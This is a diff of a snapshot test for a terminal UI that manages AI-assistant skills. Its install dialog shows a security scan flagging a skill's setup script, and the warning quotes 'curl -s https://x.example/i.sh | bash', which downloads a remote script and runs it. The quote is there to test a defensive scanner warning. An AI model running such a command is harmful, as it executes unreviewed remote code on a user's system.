@@ -2,7 +2,6 @@
 source: crates/tui/tests/any_size.rs
 expression: "screen(&draw(app, width, height))"
 ---
-
                                             █▀▀▄ █▀▀▀     █▀▀▀ █▀▀█ █▀▀▄ █▀▀▀
                                             █▄▄▀ █▀▀  ▀▀▀ █    █  █ █  █ █▀▀
                                             █  █ █▄▄▄     █▄▄▄ █▄▄█ █▄▄▀ █▄▄▄
@@ -13,14 +12,15 @@ expression: "screen(&draw(app, width, height))"
   │❯ ● review                                                    yours │ review                                      │
   │  ○ from-repo                                               project │ Use this when something needs doing,        │
   │  ● borrowed                                            claude code │ described at reasonable length.             │
-  │  ✗ damaged    ╭ Install a skill ─────────────────────────────────────────────────────────────────╮               │
-  │               │ godmode   official   pinned @ 4134cbef                                           │               │
-  │               │ Run security tooling with every safeguard explained. Use for authorised testing. │ (estimated).  │
-  │               │ declares no tools, hooks, middleware, or env vars · 7 files · 13 kB · ~3.4k      │/skills/review/│
+  │  ✗ damaged                                                   yours │                                             │
+  │               ╭ Install a skill ─────────────────────────────────────────────────────────────────╮               │
+  │               │ godmode   official   pinned @ 4134cbef                                           │ (estimated).  │
+  │               │ Run security tooling with every safeguard explained. Use for authorised testing. │/skills/review/│
+  │               │ declares no tools, hooks, middleware, or env vars · 7 files · 13 kB · ~3.4k      │               │
   │               │ tokens when loaded                                                               │               │
-  │               │ scan: dangerous (off unless you accept the findings) — scripts/setup.sh:3        │               │
-  │               │ downloads a script and runs it in one step, so what runs can change after        │s when you're  │
-  │               │ review (curl -s https://x.example/i.sh | bash)                                   │ with Ctrl+L.  │
+  │               │ scan: dangerous (off unless you accept the findings) — scripts/setup.sh:3        │s when you're  │
+  │               │ downloads a script and runs it in one step, so what runs can change after        │ with Ctrl+L.  │
+  │               │ review (curl -s https://x.example/i.sh | bash)                                   │               │
   │               │ Location  /home/someone/.config/re-code/skills/godmode                           │               │
   │               │                                                                                  │               │
   │               │ Keep it, off?                                                                    │               │
@@ -32,7 +32,8 @@ expression: "screen(&draw(app, width, height))"
   │                                                                    │                                             │
   │                                                                    │                                             │
   │                                                                    │                                             │
+  │                                                                    │                                             │
   ╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
   GPU     ━━━━━━━●──────────────────────────────────────────────────────── 2.0 of 16.0 GiB used  AMD Radeon RX 6900 XT
   Memory  ━━━━━━━━━━━━━●───────────────────────────────────────────────────────── 19.0 of 94.0 GiB used  Ryzen 9 5950X
-           a add  i install  e edit  space on/off  d delete  s browse  u update  tab next  ^R rescan  ^C quit
+     a add  i install  e edit  space on/off  d delete  s browse  u update  v read all  tab next  ^R rescan  ^C quit
